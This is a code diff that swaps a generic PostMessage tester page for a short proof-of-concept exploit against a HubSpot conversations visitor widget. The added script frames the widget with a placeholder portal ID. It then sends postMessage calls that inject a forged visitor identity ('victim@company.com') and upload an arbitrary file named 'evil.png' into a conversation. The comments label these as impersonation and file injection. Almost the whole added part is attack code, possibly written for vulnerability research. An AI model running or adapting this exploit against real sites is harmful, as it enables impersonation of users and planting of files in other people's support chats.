@@ -1,89 +1,18 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>PostMessage Tester</title>
-  <style>
-    body { font-family: monospace; font-size: 13px; padding: 1rem; background: #0f0f0f; color: #e0e0e0; }
-    input, textarea { background: #1a1a1a; color: #e0e0e0; border: 1px solid #333; padding: 6px 8px; width: 100%; box-sizing: border-box; font-family: monospace; font-size: 12px; }
-    textarea { height: 80px; resize: vertical; }
-    button { background: #1a1a1a; color: #e0e0e0; border: 1px solid #444; padding: 6px 14px; cursor: pointer; font-family: monospace; }
-    button:hover { background: #252525; }
-    label { font-size: 11px; color: #888; display: block; margin: 10px 0 4px; }
-    #log { background: #1a1a1a; border: 1px solid #333; padding: 10px; height: 200px; overflow-y: auto; margin-top: 8px; font-size: 11px; }
-    .rx { color: #4ec9b0; } .tx { color: #569cd6; } .err { color: #f44747; }
-    iframe { width: 100%; height: 500px; border: 1px solid #333; margin-top: 12px; display: block; }
-  </style>
-</head>
-<body>
+  <iframe id="w" src="https://app.hubspot.com/conversations-visitor/TARGET_PORTAL/threads/utk/anytoken?url=https://majdch22.github.io"></iframe>
+  <script>
+  document.getElementById('w').onload = () => {
+    const w = document.getElementById('w').contentWindow;
 
-  <label>iframe src</label>
-  <div style="display:flex;gap:8px;">
-    <input id="iframeSrc" value="https://target.com/page" />
-    <button onclick="loadFrame()">load</button>
-  </div>
+    // Inject visitor identity (impersonate a known email)
+    w.postMessage(JSON.stringify({
+      type: 'VISITOR_IDENTIFICATION_ATTRIBUTES',
+      data: { identificationEmail: 'victim@company.com', identificationToken: '' }
+    }), '*');
 
-  <label>target origin (for sending)</label>
-  <input id="targetOrigin" value="https://target.com" />
-
-  <label>payload</label>
-  <textarea id="payload">{"type":"test","msg":"hello"}</textarea>
-
-  <div style="display:flex;gap:8px;margin-top:8px;">
-    <button onclick="sendToFrame()">send to iframe</button>
-    <button onclick="sendToSelf()">send to self (window)</button>
-    <button onclick="clearLog()">clear log</button>
-  </div>
-
-  <label>event log</label>
-  <div id="log">waiting for messages...</div>
-
-  <iframe id="targetFrame" src="about:blank"></iframe>
-
-<script>
-  window.addEventListener('message', function(e) {
-    log('rx', `[RX] origin: ${e.origin || 'null'} | source: ${e.source === window ? 'self' : 'iframe/opener'}\n     data: ${JSON.stringify(e.data)}`);
-  });
-
-  function getPayload() {
-    const raw = document.getElementById('payload').value.trim();
-    try { return JSON.parse(raw); } catch(_) { return raw; }
-  }
-
-  function sendToFrame() {
-    const origin = document.getElementById('targetOrigin').value.trim() || '*';
-    const frame = document.getElementById('targetFrame').contentWindow;
-    if (!frame) return log('err', '[ERR] iframe not loaded');
-    try {
-      frame.postMessage(getPayload(), origin);
-      log('tx', `[TX] → iframe | origin: ${origin} | data: ${JSON.stringify(getPayload())}`);
-    } catch(e) { log('err', '[ERR] ' + e.message); }
-  }
-
-  function sendToSelf() {
-    try {
-      window.postMessage(getPayload(), '*');
-      log('tx', `[TX] → self | data: ${JSON.stringify(getPayload())}`);
-    } catch(e) { log('err', '[ERR] ' + e.message); }
-  }
-
-  function loadFrame() {
-    document.getElementById('targetFrame').src = document.getElementById('iframeSrc').value.trim();
-  }
-
-  function log(type, msg) {
-    const div = document.createElement('div');
-    div.className = type;
-    div.textContent = new Date().toISOString().split('T')[1].replace('Z','') + ' ' + msg;
-    const el = document.getElementById('log');
-    if (el.textContent === 'waiting for messages...') el.innerHTML = '';
-    el.appendChild(div);
-    el.scrollTop = el.scrollHeight;
-  }
-
-  function clearLog() {
-    document.getElementById('log').innerHTML = 'waiting for messages...';
-  }
-</script>
-
-</body>
-</html>
+    // Or: upload arbitrary file into any conversation
+    w.postMessage(JSON.stringify({
+      type: 'SCREEN_CAPTURE_BLOB',
+      data: { dataUrl: 'data:image/png;base64,PAYLOAD', fileName: 'evil.png' }
+    }), '*');
+  };
+  </script>
